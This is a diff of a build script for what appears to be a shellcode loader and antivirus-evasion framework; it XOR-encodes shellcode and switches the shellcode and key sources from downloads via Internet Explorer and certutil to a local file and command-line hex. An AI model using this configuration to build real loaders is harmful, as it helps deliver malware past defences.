@@ -34,15 +34,15 @@ printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
 encode_shellcode xor input/scraw.txt input/scenc.txt 4 input/keyraw.txt
 # convert generated key from raw to C
 # array name buf is expected by static_from_file retrieval method
-./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key.txt key
+#./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key.txt key
 
 # set shellcode source
 # convert from raw to C format using the built-in tool
 ./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt buf
-set_shellcode_source download_internet_explorer
+set_shellcode_source static_from_file input/sc.txt
 
 # set key source
-set_key_source download_certutil
+set_key_source from_command_line_hex
 
 # set decoder
 set_decoder xor
